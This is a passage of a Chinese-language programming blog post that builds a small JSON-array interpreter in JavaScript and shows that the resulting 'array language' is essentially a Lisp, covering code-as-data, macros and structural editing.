  <span class="token keyword">const</span> <span class="token function-variable function">parseFnInstruction</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">args<span class="token punctuation">,</span> body<span class="token punctuation">,</span> oldVariables</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>values</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token keyword">const</span> newVariables <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token operator">...</span>oldVariables<span class="token punctuation">,</span>
        <span class="token operator">...</span><span class="token function">mapArgsWithValues</span><span class="token punctuation">(</span>args<span class="token punctuation">,</span> values<span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token punctuation">}</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token function">parseInstruction</span><span class="token punctuation">(</span>body<span class="token punctuation">,</span> newVariables<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> <span class="token function-variable function">parseInstruction</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">ins<span class="token punctuation">,</span> variables</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>variables<span class="token punctuation">[</span>ins<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> variables<span class="token punctuation">[</span>ins<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>ins<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> ins<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>fName<span class="token punctuation">,</span> <span class="token operator">...</span>args<span class="token punctuation">]</span> <span class="token operator">=</span> ins<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>fName <span class="token operator">===</span> <span class="token string">'fn'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> <span class="token function">parseFnInstruction</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">,</span> variables<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">const</span> fn <span class="token operator">=</span> fns<span class="token punctuation">[</span>fName<span class="token punctuation">]</span> <span class="token operator">||</span> variables<span class="token punctuation">[</span>fName<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">arg</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">parseInstruction</span><span class="token punctuation">(</span>arg<span class="token punctuation">,</span> variables<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>

  <span class="token function">parseInstruction</span><span class="token punctuation">(</span>instructions<span class="token punctuation">,</span> variables<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p>我滴娘，有了上面的代码，我们现在可以解析这种命令了：</p> <div class="language-json extra-class"><pre class="language-json"><code><span class="token punctuation">[</span>
  <span class="token string">&quot;do&quot;</span><span class="token punctuation">,</span>
  <span class="token punctuation">[</span>
    <span class="token string">&quot;def&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;drawTriangle&quot;</span><span class="token punctuation">,</span>
    <span class="token punctuation">[</span>
      <span class="token string">&quot;fn&quot;</span><span class="token punctuation">,</span>
      <span class="token punctuation">[</span><span class="token string">&quot;left&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;top&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;right&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;color&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
      <span class="token punctuation">[</span>
        <span class="token string">&quot;do&quot;</span><span class="token punctuation">,</span>
        <span class="token punctuation">[</span><span class="token string">&quot;drawLine&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;left&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;top&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;color&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token punctuation">[</span><span class="token string">&quot;drawLine&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;top&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;right&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;color&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token punctuation">[</span><span class="token string">&quot;drawLine&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;left&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;right&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;color&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
      <span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token punctuation">[</span><span class="token string">&quot;drawTriangle&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">3</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">&quot;blue&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token punctuation">[</span><span class="token string">&quot;drawTriangle&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">6</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">10</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">16</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">&quot;purple&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span>)
</code></pre></div><p>我们可以组合函数，我们可以定义变量，我们甚至可以创造自定义的函数！如果仔细想想，这不就是创造了一个编程语言吗！</p> <h2 id="试试看"><a href="#试试看" class="header-anchor">#</a> 试试看</h2> <p>这就是上面的绘制三角形的例子🙂</p> <p><a href="https://jsfiddle.net/xn3tkdhL/3/" target="_blank" rel="noopener noreferrer">点击<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>还有一个快乐的小人的例子</p> <p><a href="https://jsfiddle.net/xn3tkdhL/2/" target="_blank" rel="noopener noreferrer">点击<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <h2 id="惊喜"><a href="#惊喜" class="header-anchor">#</a> 惊喜</h2> <p>由于我们发明的编程函数总是在执行JSON数组，那么不妨将它命名为数组语言吧。</p> <p>而且，它在某些方面要比Javascirpt更好！往下看：</p> <h2 id="没什么特殊的"><a href="#没什么特殊的" class="header-anchor">#</a> 没什么特殊的</h2> <p>在Javascript中，我们使用<code>const x = foo</code>定义变量。假设你想把<code>const</code>重新定义成<code>c</code>，你是做不到的，因为<code>const x = foo</code>是Javascript中定义变量的特定语法。你是不能修改语法的。</p> <p>但是在我们发明的数组语言中，我们是可以做到的，因为压根就没有任何语法！任何东西都是数组。所以你可以很轻松地用<code>c</code>替换掉任何命令，比如<code>def</code>。</p> <p>打个比方，使用Javascirpt编程时，我们是客人，我们需要遵循语言设计者规定的各种规则。但是咱我们的数组语言中，我们是“联合创始人”。语言“内置”的东西（“def”，“fn”）跟用户自己写的内容没有本质上的不同！（“drawTriangle”）。</p> <h2 id="code-is-data"><a href="#code-is-data" class="header-anchor">#</a> Code is Data</h2> <p>此外，还有一个特别的优势。想想看，我们的代码就是一堆数组而已，所以我们可以很容易地用代码生成代码！</p> <p>比如，如果我们想在Javascript中支持<code>unless</code>这个语法：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token function">unless</span><span class="token punctuation">(</span><span class="token parameter">foo</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token operator">...</span>
<span class="token punctuation">}</span>
</code></pre></div><p>等价于这样的形式：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>foo<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token operator">...</span>
<span class="token punctuation">}</span>
</code></pre></div><p>这当然是可行的，但是要麻烦得多。我们得需要借助Babel去解析文件，遍历AST然后去改写生成对应的代码：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>foo<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token operator">...</span>
<span class="token punctuation">}</span>
</code></pre></div><p>但是在我们的数组语言中，代码本身只不过是数组而已！所以要想支持<code>unless</code>简直不要太简单：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">rewiteUnless</span><span class="token punctuation">(</span><span class="token parameter">unlessCode</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token punctuation">[</span>_unlessInstructionName<span class="token punctuation">,</span> testCondition<span class="token punctuation">,</span> consequent<span class="token punctuation">]</span> <span class="token operator">=</span> unlessCode<span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token string">&quot;if&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">&quot;not&quot;</span><span class="token punctuation">,</span> testCondition<span class="token punctuation">]</span><span class="token punctuation">,</span> consequent<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token function">rewriteUnless</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">&quot;unless&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">&quot;=&quot;</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">&quot;drawLine&quot;</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment">// =&gt;</span>
<span class="token punctuation">[</span><span class="token string">&quot;if&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">&quot;not&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">&quot;=&quot;</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">&quot;drawLine&quot;</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
</code></pre></div><p>轻松加愉快。</p> <h2 id="structual-editing"><a href="#structual-editing" class="header-anchor">#</a> Structual editing</h2> <p>代码就是数据，不仅可以让我们更容易地操纵代码，还可以让编辑器更方便地造作。比如，如果你在编辑下面的代码：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token punctuation">[</span><span class="token string">&quot;if&quot;</span><span class="token punctuation">,</span> testCondition<span class="token punctuation">,</span> consequent<span class="token punctuation">]</span>
</code></pre></div><p>你想把<code>testCondition</code>替换成<code>[&quot;not&quot;, testCondition]</code>。</p> <p>你可以将光标移动至<code>testCondition</code>前面：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token punctuation">[</span><span class="token string">&quot;if&quot;</span><span class="token punctuation">,</span> <span class="token operator">|</span>testCondition<span class="token punctuation">,</span> consequent<span class="token punctuation">]</span>
</code></pre></div><p>然后创建一个数组：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token punctuation">[</span><span class="token string">&quot;if&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token operator">|</span><span class="token punctuation">]</span> testCondition<span class="token punctuation">,</span> consequent<span class="token punctuation">]</span>
</code></pre></div><p>然后输入“not”：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token punctuation">[</span><span class="token string">&quot;if&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">&quot;not&quot;</span><span class="token punctuation">,</span> <span class="token operator">|</span><span class="token punctuation">]</span> testCondition<span class="token punctuation">,</span> consequent<span class="token punctuation">]</span>
</code></pre></div><p>如果你的编辑器能够理解这些数组，那么你可以让编辑器将<code>]</code>向右异动一层：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token punctuation">[</span><span class="token string">&quot;if&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">&quot;not&quot;</span><span class="token punctuation">,</span> testCondition<span class="token punctuation">]</span><span class="token punctuation">,</span> consequent<span class="token punctuation">]</span>
</code></pre></div><p>看，编辑器可以很容易地帮你修改代码的结构。</p> <p>如果你想撤销这个改动，你可以把光标放在<code>testCondition</code>旁边，</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token punctuation">[</span><span class="token string">&quot;if&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">&quot;not&quot;</span><span class="token punctuation">,</span> <span class="token operator">|</span>testCondition<span class="token punctuation">]</span><span class="token punctuation">,</span> consequent<span class="token punctuation">]</span>
</code></pre></div><p>然后让编辑器“撤销”一个层级：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token punctuation">[</span><span class="token string">&quot;if&quot;</span><span class="token punctuation">,</span> testCondition<span class="token punctuation">,</span> consequent<span class="token punctuation">]</span>
</code></pre></div><p>一瞬间，编辑器就可以完成这一切，不需要输入额外的字符。这就叫做structual editing。它可以帮助你提高编程效率，而这是code is data带来的若干好处之一。</p> <h2 id="我们发现了什么"><a href="#我们发现了什么" class="header-anchor">#</a> 我们发现了什么？</h2> <p>emmm，我们刚才发明的数组语言。。实际上可以看作是Lisp的一个方言！</p> <p>这是我们最复杂的例子：</p> <div class="language-json extra-class"><pre class="language-json"><code><span class="token punctuation">[</span>
  <span class="token string">&quot;do&quot;</span><span class="token punctuation">,</span>
  <span class="token punctuation">[</span>
    <span class="token string">&quot;def&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;drawTriangle&quot;</span><span class="token punctuation">,</span>
    <span class="token punctuation">[</span>
      <span class="token string">&quot;fn&quot;</span><span class="token punctuation">,</span>
      <span class="token punctuation">[</span><span class="token string">&quot;left&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;top&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;right&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;color&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
      <span class="token punctuation">[</span>
        <span class="token string">&quot;do&quot;</span><span class="token punctuation">,</span>
        <span class="token punctuation">[</span><span class="token string">&quot;drawLine&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;left&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;top&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;color&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token punctuation">[</span><span class="token string">&quot;drawLine&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;top&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;right&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;color&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token punctuation">[</span><span class="token string">&quot;drawLine&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;left&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;right&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;color&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
      <span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token punctuation">[</span><span class="token string">&quot;drawTriangle&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">3</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">&quot;blue&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token punctuation">[</span><span class="token string">&quot;drawTriangle&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">6</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">10</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token number">16</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">&quot;purple&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span>)
</code></pre></div><p>如果用Clojure（一种Lisp的方言）写出来是这样：</p> <div class="language-clojure extra-class"><pre class="language-clojure"><code><span class="token punctuation">(</span><span class="token keyword">do</span>
  <span class="token punctuation">(</span><span class="token keyword">def</span> draw-triangle <span class="token punctuation">(</span><span class="token keyword">fn</span> <span class="token punctuation">[</span>left top right color<span class="token punctuation">]</span>
                       <span class="token punctuation">(</span><span class="token function">draw-line</span> left top color<span class="token punctuation">)</span>
                       <span class="token punctuation">(</span><span class="token function">draw-line</span> top right color<span class="token punctuation">)</span>
                       <span class="token punctuation">(</span><span class="token function">draw-line</span> left right color<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token function">draw-triangle</span> <span class="token punctuation">{</span><span class="token symbol">:x</span> <span class="token number">0</span> <span class="token symbol">:y</span> <span class="token number">0</span><span class="token punctuation">}</span> <span class="token punctuation">{</span><span class="token symbol">:x</span> <span class="token number">3</span> <span class="token symbol">:y</span> <span class="token number">3</span><span class="token punctuation">}</span> <span class="token punctuation">{</span><span class="token symbol">:x</span> <span class="token number">6</span> <span class="token symbol">:y</span> <span class="token number">0</span><span class="token punctuation">}</span> <span class="token string">&quot;blue&quot;</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token function">draw-triangle</span> <span class="token punctuation">{</span><span class="token symbol">:x</span> <span class="token number">6</span> <span class="token symbol">:y</span> <span class="token number">6</span><span class="token punctuation">}</span> <span class="token punctuation">{</span><span class="token symbol">:x</span> <span class="token number">10</span> <span class="token symbol">:y</span> <span class="token number">10</span><span class="token punctuation">}</span> <span class="token punctuation">{</span><span class="token symbol">:x</span> <span class="token number">6</span> <span class="token symbol">:y</span> <span class="token number">16</span><span class="token punctuation">}</span> <span class="token string">&quot;purple&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre></div><p>区别其实不大，仅有下面这些：</p> <ul><li><code>()</code>现在表示数组</li> <li>去掉了逗号</li> <li>驼峰命名（camelCase）变成了烤串命名（kebab-case）</li> <li>将所有的<code>string</code>替换成了一种新的数据类型<code>symbol</code>。比如将<code>&quot;drawTriangle&quot;</code>变成了<code>draw-triangle</code></li></ul> <p>剩下的规则都是一样的：</p> <div class="language-clojure extra-class"><pre class="language-clojure"><code><span class="token punctuation">(</span><span class="token function">draw-line</span> left top color<span class="token punctuation">)</span>
</code></pre></div><p>意思是</p> <ul><li>计算<code>left</code>，<code>top</code>，<code>color</code>这些变量的值</li> <li>用上面的参数调用<code>draw-line</code>这个函数</li></ul> <h2 id="发现"><a href="#发现" class="header-anchor">#</a> 发现？</h2> <p>什么样的编程语言最有利于操纵源代码（元编程）呢？</p> <p>上面的问题，其实可以转换成：我们怎么能够让操纵代码就像操纵数据那样直观简单呢？答案很显然了，就是让代码就是数据！如果我们需要操纵代码，那么代码必须是数据！</p> <p>如果代码必须是数据，那么我们可以使用什么样的数据结构呢？XML也许可以，JSON也许也可以，等等等等。但如果我们想找到一个最简单的结构，那么答案将是：数组！</p> <p>这个结论很有启发性，也很令人激动。</p> <p>说很有启发性，是因为这就好像是我们重新“发明”了Lisp。如果你想操纵代码，那么结果就是你一定会发明Lisp！就好像是发现万有引力重力一样自然。如果有外星人，那么他们也一定在使用Lisp！</p> <p>说令人激动，是因为要支持元编程，上述语法或许还可以进一步改进。印象中Ruby和Python就是在尝试既保留Lisp的元编程能力又想把括号去掉。我不认为这个问题就到此被解决了。也许你可以想出更好的办法。🙂</p> <h2 id="最后"><a href="#最后" class="header-anchor">#</a> 最后</h2> <p>如果你可以改写编程语言，可以想象这会极大丰富语言的表达能力。你将会真正地跟语言的设计者平起平坐，拥有更高级的抽象能力，可以节省大量的工作时间。</p> <p>突然，你发现，那些括号看着还蛮酷的！</p></div></div> <div class="comment" data-v-63da4bd6><Vssue data-v-63da4bd6></Vssue></div></div></div> <div class="container" data-v-07c4fbe2 data-v-ad494eec>
  Designed by <a href="/about" data-v-07c4fbe2>Lishunyang</a> | <a href="https://beian.miit.gov.cn/" target="_blank" data-v-07c4fbe2>京ICP备20009157号</a> | All right reserved
</div></div><div class="global-ui"></div></div>
    <script src="/blog/assets/js/app.dfbb514b.js" defer></script><script src="/blog/assets/js/2.e0432708.js" defer></script><script src="/blog/assets/js/46.9ecb7d6c.js" defer></script>
  </body>
</html>
